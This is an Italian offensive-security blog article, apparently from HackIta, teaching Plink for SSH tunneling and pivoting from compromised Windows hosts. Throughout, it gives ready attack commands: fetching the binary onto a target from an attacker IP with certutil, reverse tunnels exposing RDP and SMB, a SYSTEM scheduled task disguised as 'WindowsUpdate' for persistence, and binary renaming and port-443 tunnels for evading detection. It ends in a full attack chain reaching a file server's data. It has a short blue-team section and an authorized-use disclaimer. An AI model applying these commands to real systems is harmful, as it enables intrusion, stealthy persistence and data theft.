---
title: 'Plink: Port Forwarding e Tunneling SSH da Linea di Comando in Ambienti Windows'
slug: plink
description: 'Plink è la versione command-line di PuTTY che consente tunneling SSH, port forwarding e pivoting da sistemi Windows. Guida pratica all’uso in penetration testing e Red Team.'
image: /Gemini_Generated_Image_81406f81406f8140.webp
draft: true
date: 2026-02-09T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - pivoting
  - tunneling
  - lateral-movement
---

Plink è il client SSH a riga di comando del progetto PuTTY. Quando lavori su un target Windows senza OpenSSH nativo (versioni pre-2018 di Windows Server, sistemi legacy, ambienti hardened dove OpenSSH è stato rimosso), Plink è spesso l'unico tool disponibile — o il più facile da trasferire — per creare tunnel SSH.

Nel contesto offensivo, Plink permette di stabilire connessioni SSH reverse, creare port forwarding locale e remoto, e costruire tunnel per pivotare dalla macchina Windows compromessa verso il tuo attacker box o verso reti interne. È un singolo eseguibile portable, non richiede installazione e pesa meno di 1MB.

Nella kill chain si colloca nella fase di **Command & Control** e **Lateral Movement** (MITRE ATT\&CK T1572, T1021.004). Questo articolo copre ogni aspetto operativo: dal trasferimento del binario al target fino a scenari di pivoting multi-hop.

***

## 1️⃣ Setup e Installazione

Plink non si installa: è un singolo eseguibile `.exe`. Il punto critico è trasferirlo sul target Windows.

**Download ufficiale:**

```bash
# Dal tuo attacker box (Linux)
wget https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe
```

**Trasferimento sul target Windows** — metodi comuni:

Via web server Python dal tuo box:

```bash
python3 -m http.server 80
```

Dal target Windows (PowerShell):

```powershell
Invoke-WebRequest -Uri http://10.10.14.22/plink.exe -OutFile C:\Temp\plink.exe
```

Alternativa con certutil (non richiede PowerShell):

```cmd
certutil -urlcache -split -f http://10.10.14.22/plink.exe C:\Temp\plink.exe
```

**Verifica:**

```cmd
C:\Temp\plink.exe -V
```

Output:

```
plink: Release 0.82
```

**Requisiti:**

* Connettività TCP dal target al tuo SSH server (o viceversa)
* Server SSH attivo sull'attacker box (se usi reverse tunnel)
* Nessun prerequisito sul target oltre l'eseguibile

***

## 2️⃣ Uso Base

### Port forwarding locale

Esponi una porta del target o di un host interno sulla tua macchina:

```cmd
plink.exe -ssh -L 8888:172.16.0.10:80 user@10.10.14.22 -pw Password1 -N
```

* `-L 8888:172.16.0.10:80` → porta locale 8888 inoltra a 172.16.0.10:80 attraverso il target
* `-N` → nessun comando remoto, solo tunnel
* `-pw` → password inline (non ideale per OPSEC, ma funzionale in test)

Ora dal tuo browser: `http://127.0.0.1:8888` raggiunge la webapp interna su 172.16.0.10.

### Port forwarding remoto (reverse)

Esponi un servizio del target sulla tua macchina:

```cmd
plink.exe -ssh -R 9999:127.0.0.1:3389 user@10.10.14.22 -pw Password1 -N
```

Il target espone la sua porta RDP (3389) sulla porta 9999 del tuo attacker box. Connettiti con:

```bash
xfreerdp /v:127.0.0.1:9999 /u:admin /p:Password
```

### Accettare la host key automaticamente

Al primo collegamento, Plink chiede di confermare la host key SSH — un problema nelle shell non interattive. Soluzione:

```cmd
echo y | plink.exe -ssh user@10.10.14.22 -pw Password1 -N -R 9999:127.0.0.1:3389
```

Il pipe di `y` risponde automaticamente alla domanda.

***

## 3️⃣ Tecniche Operative

### Reverse tunnel per callback da rete isolata

Il target Windows è in una rete senza accesso diretto in ingresso. Puoi però raggiungere il tuo attacker box in uscita. Crea un reverse tunnel:

```cmd
plink.exe -ssh -R 4444:127.0.0.1:4444 attacker@10.10.14.22 -pw P@ss -N
```

Qualsiasi traffico che arriva sulla porta 4444 del tuo box viene inoltrato alla porta 4444 locale del target. Usalo per ricevere reverse shell da altri host nella rete del target.

### Dynamic port forwarding (SOCKS proxy)

Plink supporta il dynamic forwarding per creare un SOCKS proxy:

```cmd
plink.exe -ssh -D 1080 user@10.10.14.22 -pw Password1 -N
```

Dalla macchina Windows, configura il browser o tool per usare `127.0.0.1:1080` come SOCKS proxy. Tutto il traffico passa attraverso il tuo attacker box.

Più utile nel senso opposto — dal tuo box, crea il tunnel verso il target:

```bash
ssh -D 1080 -N user@target-windows
```

Ma questo richiede OpenSSH sul target. Se non c'è, l'alternativa è il reverse dynamic forward con OpenSSH 7.6+:

```cmd
plink.exe -ssh -R 1080 user@10.10.14.22 -pw Password1 -N
```

### Tunnel attraverso un jump host

Il target Windows raggiunge un host interno (172.16.0.5) che tu non puoi raggiungere:

```cmd
plink.exe -ssh -L 5985:172.16.0.5:5985 user@10.10.14.22 -pw Password1 -N
```

Ora dal tuo box:

```bash
evil-winrm -i 127.0.0.1 -P 5985 -u admin -p 'AdminPass'
```

Connessione WinRM diretta a 172.16.0.5 attraverso il tunnel Plink.

***

## 4️⃣ Tecniche Avanzate

### Tunnel persistente con task schedulato

Crea un task Windows che rilancia Plink al boot:

```cmd
schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\plink.exe -ssh -R 9999:127.0.0.1:3389 user@10.10.14.22 -pw P@ss -N -batch" /sc onstart /ru SYSTEM
```

* `/tn "WindowsUpdate"` → nome mimetizzato
* `-batch` → non chiede conferma host key
* `/ru SYSTEM` → esegue come SYSTEM

Questo garantisce un tunnel reverse persistente che sopravvive ai reboot.

### Port forwarding multiplo in una singola sessione

```cmd
plink.exe -ssh -L 445:172.16.0.10:445 -L 3389:172.16.0.10:3389 -L 5985:172.16.0.20:5985 user@10.10.14.22 -pw Pass -N
```

Una sola connessione SSH, tre port forward. Riduci il numero di processi e connessioni visibili.

### Chiave SSH al posto della password

Genera una chiave ed evita password in chiaro nella command line:

```bash
# Sul tuo box
ssh-keygen -t ed25519 -f plink_key -N ""
cat plink_key.pub >> ~/.ssh/authorized_keys
```

Converti la chiave in formato PuTTY con `puttygen`, poi sul target:

```cmd
plink.exe -ssh -i C:\Temp\plink_key.ppk user@10.10.14.22 -N -R 9999:127.0.0.1:3389
```

Nessuna password nei log di processo.

### Evasion: rinomina il binario

Antivirus e EDR possono flaggare `plink.exe` per nome. Rinomina:

```cmd
copy C:\Temp\plink.exe C:\Windows\Temp\svchost-update.exe
C:\Windows\Temp\svchost-update.exe -ssh -R 9999:127.0.0.1:3389 user@10.10.14.22 -pw P@ss -N -batch
```

Il nome non cambia il binario, ma evita regole di detection basate su process name.

***

## 5️⃣ Scenari Pratici di Pentest

### Scenario 1: Windows Server legacy senza OpenSSH — Accesso RDP dal tuo box

```cmd
echo y | plink.exe -ssh -R 13389:127.0.0.1:3389 kali@10.10.14.22 -pw kalipass -N -batch
```

**Output atteso:** nessun output dopo connessione (il tunnel è attivo e silente).

**Cosa fare se fallisce:**

* `Network error: Connection refused` → SSH non raggiungibile. Verifica firewall in uscita del target. Prova porta 443: `plink.exe -ssh -P 443 ...`
* `FATAL ERROR: Host key not in cache` → Manca il `echo y |` oppure il flag `-batch`. Aggiungi entrambi.

**Timeline:** Trasferimento binario 30 secondi. Tunnel attivo in 5 secondi. Connessione RDP immediata.

### Scenario 2: Pivoting verso domain controller interno

```cmd
plink.exe -ssh -L 445:172.16.0.10:445 -L 135:172.16.0.10:135 kali@10.10.14.22 -pw pass -N -batch
```

Dal tuo box:

```bash
crackmapexec smb 127.0.0.1 -u admin -p Password1
```

**Output atteso:**

```
SMB  127.0.0.1  445  DC01  [+] CORP\admin:Password1 (Pwn3d!)
```

**Cosa fare se fallisce:**

* `Connection reset` → La porta 445 locale è già occupata (Samba). Usa una porta alternativa: `-L 44500:172.16.0.10:445` e connettiti a `127.0.0.1:44500`.
* Timeout → Il target non raggiunge 172.16.0.10 sulla porta 445. Verifica routing dal target: `tracert 172.16.0.10`.

**Timeline:** 10 secondi per tunnel. Enumerazione SMB in 30 secondi.

### Scenario 3: Exfiltrazione dati da rete air-gapped (con accesso outbound limitato)

Il target raggiunge solo porta 53 (DNS) e 443 (HTTPS) in uscita. Configura SSH sull'attacker box sulla porta 443:

```bash
# Sul tuo box
sudo sed -i 's/#Port 22/Port 443/' /etc/ssh/sshd_config
sudo systemctl restart sshd
```

Dal target:

```cmd
plink.exe -ssh -P 443 -R 8080:127.0.0.1:80 user@10.10.14.22 -pw Pass -N -batch
```

**Output atteso:** tunnel attivo su porta 443 (si confonde con traffico HTTPS).

**Cosa fare se fallisce:**

* Deep packet inspection blocca SSH su 443 → Usa [Ngrok](https://hackita.it/articoli/ngrok) come intermediario o un wrapper TLS come stunnel.
* Proxy aziendale in mezzo → Plink supporta proxy HTTP: `plink.exe -ssh -proxycmd "C:\Temp\connect.exe -H proxy.corp:8080 %host %port" ...`

**Timeline:** Configurazione 1 minuto. Tunnel stabile.

***

## 6️⃣ Toolchain Integration

Plink è il componente di tunneling per ambienti Windows dove SSH nativo non è disponibile.

**Flusso operativo:**

Initial Access (web exploit) → Shell Windows → **Plink (tunnel)** → Attacker box → [ProxyChains](https://hackita.it/articoli/proxychains) → Tool offensivi verso rete interna

**Passaggio dati:**

```cmd
REM Sul target: crea tunnel reverse
plink.exe -ssh -R 1080 user@10.10.14.22 -pw Pass -N -batch
```

```bash
# Sul tuo box: usa il SOCKS proxy creato da Plink
proxychains4 crackmapexec smb 172.16.0.0/24
```

Plink crea il tunnel, ProxyChains lo sfrutta per instradare i tool offensivi.

| Scenario                        | Plink | SSH nativo Windows | Chisel            | [Ngrok](https://hackita.it/articoli/ngrok) |
| ------------------------------- | ----- | ------------------ | ----------------- | ------------------------------------------ |
| Disponibilità su legacy Windows | Sì    | No (pre-2018)      | Richiede transfer | Richiede transfer                          |
| Dimensione binario              | \~1MB | Integrato          | \~8MB             | \~15MB                                     |
| Detection rate AV               | Basso | Nessuno            | Medio             | Medio                                      |
| Port forwarding locale          | Sì    | Sì                 | Sì                | No                                         |
| Port forwarding remoto          | Sì    | Sì                 | Sì                | Sì                                         |
| SOCKS proxy                     | Sì    | Sì                 | Sì                | No nativo                                  |
| Richiede account SSH remoto     | Sì    | Sì                 | No                | No                                         |

***

## 7️⃣ Attack Chain Completa

**Obiettivo:** Da una macchina Windows compromessa in DMZ, raggiungere e compromettere un file server nella rete interna.

**Fase 1 — Initial Access (25 min)**

Exploit di una vulnerabilità IIS su 10.10.10.80. Ottieni una web shell come `iis apppool\defaultapppool`.

**Fase 2 — Transfer Plink (1 min)**

```cmd
certutil -urlcache -split -f http://10.10.14.22/plink.exe C:\Windows\Temp\plink.exe
```

**Fase 3 — Privilege Escalation (20 min)**

Enumerazione con winPEAS. Servizio con unquoted service path → escalation a SYSTEM.

**Fase 4 — Tunnel Setup (1 min)**

```cmd
echo y | C:\Windows\Temp\plink.exe -ssh -L 445:172.16.0.50:445 -L 5985:172.16.0.50:5985 kali@10.10.14.22 -pw pass -N -batch
```

**Fase 5 — Lateral Movement (15 min)**

Dal tuo box:

```bash
evil-winrm -i 127.0.0.1 -P 5985 -u admin -p 'FileServerPass!'
```

Sessione WinRM sul file server 172.16.0.50 attraverso il tunnel Plink.

**Fase 6 — Data Access (10 min)**

Navighi le share del file server, trovi documenti sensibili. Tutto attraverso il tunnel.

**Timeline totale:** \~72 minuti.

***

## 8️⃣ Detection & Evasion

### Cosa monitora il Blue Team

* Processo `plink.exe` in esecuzione (o binario PuTTY-related)
* Connessioni SSH in uscita da server che normalmente non ne generano
* Event ID 1 (Sysmon) — process creation con argomenti contenenti `-ssh`, `-R`, `-L`
* Event ID 3 (Sysmon) — connessione di rete verso porta 22 esterna

### Log rilevanti

* Windows Security Event ID 4688 → Process Creation con command line logging
* Sysmon Event ID 1 → Process Create (argomenti completi)
* Sysmon Event ID 3 → Network Connection
* Firewall logs → connessione outbound TCP verso SSH esterno

### Tecniche di evasion

1. **Rinomina binario:** `plink.exe` → `RuntimeBroker.exe` o altro processo legittimo Windows. Detection basata su nome processo viene bypassata.
2. **Porta non standard:** usa porta 443 o 53 per la connessione SSH. Il traffico appare come HTTPS o DNS a livello L3/L4.
3. **Chiave SSH invece di password:** evita che la password appaia nei log di command line (Event ID 4688). Usa `-i keyfile.ppk`.

### Cleanup

```cmd
taskkill /f /im plink.exe
del C:\Temp\plink.exe
schtasks /delete /tn "WindowsUpdate" /f
```

Rimuovi anche la chiave pubblica dal tuo `authorized_keys` se ne hai aggiunta una dedicata.

***

## 9️⃣ Performance & Scaling

**Single tunnel:** overhead trascurabile. Il forwarding di una singola porta aggiunge \~5-15ms di latenza. Trasferimenti file attraverso il tunnel raggiungono facilmente 10-50 Mbps a seconda della connessione.

**Tunnel multipli:** un singolo processo Plink gestisce più forward (`-L` e `-R` multipli). Meglio un processo con 5 forward che 5 processi separati — meno rumore, meno risorse.

**Limitazioni:**

* Plink non supporta multiplexing SSH (a differenza di OpenSSH)
* In caso di disconnessione, il tunnel non si riconnette automaticamente
* Per tunnel persistenti su ingaggi lunghi, combina con task scheduler per auto-restart

**Ottimizzazione per trasferimenti pesanti:**

```cmd
plink.exe -ssh -C -L 445:172.16.0.10:445 user@10.10.14.22 -pw Pass -N
```

Il flag `-C` abilita la compressione SSH. Utile per traffico SMB che contiene molti dati ripetitivi.

***

## 🔟 Tabelle Tecniche

### Command Reference

| Comando                                         | Descrizione               |
| ----------------------------------------------- | ------------------------- |
| `plink.exe -ssh user@host`                      | Connessione SSH base      |
| `plink.exe -ssh -L lport:rhost:rport user@host` | Local port forward        |
| `plink.exe -ssh -R rport:lhost:lport user@host` | Remote port forward       |
| `plink.exe -ssh -D port user@host`              | Dynamic SOCKS proxy       |
| `plink.exe -ssh -P port user@host`              | Porta SSH custom          |
| `plink.exe -ssh -i key.ppk user@host`           | Autenticazione con chiave |
| `plink.exe -ssh -pw pass user@host`             | Password inline           |
| `plink.exe -ssh -N user@host`                   | No shell, solo tunnel     |
| `plink.exe -ssh -batch user@host`               | Non-interactive mode      |
| `plink.exe -ssh -C user@host`                   | Compressione abilitata    |

### Plink vs alternative per tunneling Windows

| Feature                | Plink    | OpenSSH Windows      | Chisel | Netsh portproxy |
| ---------------------- | -------- | -------------------- | ------ | --------------- |
| Binario portable       | Sì       | No (feature Windows) | Sì     | Integrato       |
| Dimensione             | \~1MB    | N/A                  | \~8MB  | N/A             |
| Reverse tunnel         | Sì       | Sì                   | Sì     | No              |
| SOCKS proxy            | Sì       | Sì                   | Sì     | No              |
| Richiede SSH remoto    | Sì       | Sì                   | No     | No              |
| Stealth                | ★★★☆     | ★★★★                 | ★★☆☆   | ★★★★★           |
| Legacy Windows support | Sì (XP+) | No (Win10 1809+)     | Sì     | Sì (Vista+)     |

***

## 11️⃣ Troubleshooting

| Problema                                   | Causa                                | Fix                                                      |
| ------------------------------------------ | ------------------------------------ | -------------------------------------------------------- |
| `FATAL ERROR: Host key not in cache`       | Prima connessione SSH                | Usa `echo y \|` prima del comando o `-batch`             |
| `Network error: Connection refused`        | SSH non raggiungibile                | Verifica porta e firewall outbound                       |
| Tunnel attivo ma porta locale non risponde | Porta già in uso                     | Cambia porta locale: `-L 44500:...`                      |
| `Access denied`                            | Credenziali errate                   | Verifica user/pass. Testa con `plink.exe -ssh user@host` |
| Processo muore dopo pochi secondi          | Shell non interattiva chiude stdin   | Aggiungi `-N` e `-batch`                                 |
| Lentezza estrema                           | Connessione lenta senza compressione | Aggiungi `-C` per compressione                           |

***

## 12️⃣ FAQ

**Plink funziona su Windows 64-bit e 32-bit?**
Sì. Scarica la versione corretta dal sito ufficiale PuTTY. Esistono build per x86, x64 e ARM.

**Posso usare Plink senza password visibile nella command line?**
Sì. Usa autenticazione con chiave: `-i keyfile.ppk`. La chiave va convertita in formato PuTTY con `puttygen`.

**Plink viene rilevato dagli antivirus?**
Raramente. È un software legittimo firmato. Alcuni EDR avanzati flaggano l'uso di tunnel SSH da processi non standard, ma il binario stesso non viene bloccato.

**Qual è la differenza tra Plink e PuTTY?**
PuTTY ha interfaccia grafica. Plink è l'equivalente a riga di comando — ideale per automazione e script in ambienti senza GUI.

**Posso creare tunnel Plink da una reverse shell cmd.exe?**
Sì, ma devi gestire la conferma host key con `echo y |` e usare `-batch` per evitare prompt interattivi.

***

## 13️⃣ Cheat Sheet

| Azione            | Comando                                                                             |
| ----------------- | ----------------------------------------------------------------------------------- |
| Reverse RDP       | `echo y \| plink.exe -ssh -R 13389:127.0.0.1:3389 user@attacker -pw pass -N -batch` |
| Local forward SMB | `plink.exe -ssh -L 44500:DC:445 user@attacker -pw pass -N`                          |
| SOCKS proxy       | `plink.exe -ssh -D 1080 user@attacker -pw pass -N`                                  |
| Multi-forward     | `plink.exe -ssh -L 445:DC:445 -L 5985:DC:5985 user@attacker -pw pass -N`            |
| Con chiave SSH    | `plink.exe -ssh -i key.ppk user@attacker -N -R 9999:127.0.0.1:3389`                 |
| Porta SSH custom  | `plink.exe -ssh -P 443 user@attacker -pw pass -N -R 9999:127.0.0.1:3389`            |
| Transfer binario  | `certutil -urlcache -split -f http://attacker/plink.exe C:\Temp\plink.exe`          |
| Cleanup           | `taskkill /f /im plink.exe && del C:\Temp\plink.exe`                                |

***

**Disclaimer:** Plink è un software legittimo del progetto PuTTY. Le tecniche descritte sono esclusivamente per penetration test autorizzati e simulazioni Red Team. L'uso improprio costituisce reato informatico. Download ufficiale: [chiark.greenend.org.uk/\~sgtatham/putty](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html).

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
